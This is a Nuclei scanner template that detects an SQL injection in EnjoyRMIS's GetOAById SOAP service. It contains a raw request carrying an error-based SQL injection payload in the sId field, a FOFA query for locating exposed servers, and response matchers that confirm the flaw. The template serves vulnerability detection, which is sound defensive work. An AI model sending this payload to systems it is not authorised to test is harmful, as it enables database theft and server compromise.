http/vulnerabilities/other/enjoyrmis-sqli.yaml

id: enjoyrmis-sqli

info:
  name: EnjoyRMIS - SQL Injection
  author: securityforeveryone
  severity: high
  description: |
    EnjoyRMIS GetOAById has a SQL injection vulnerability, through which an attacker can obtain sensitive database information and even control the server.
  reference:
    - https://github.com/wy876/POC/blob/main/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: body="CheckSilverlightInstalled"
    verified: true
    max-request: 1
  tags: enjoyrmis,sqli

http:
  - raw:
      - |
        POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetOAById"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetOAById xmlns="http://tempuri.org/">
              <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
            </GetOAById>
          </soap:Body>
        </soap:Envelope>

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"qqqzq1qvkqq")'
          - 'contains(header,"text/xml")'
          - 'status_code == 500'
        condition: and
# digest: 490a004630440220465fba8cb0b906dc7a190fbbce48ff32f9cc5a0563f09224af7c275920ec43fe022074d9e7e3216dec46204cb3c1f244cb56f60af99f9390fbd4b5e9095b360537bf:922c64590222798bb761d5b6d8e72950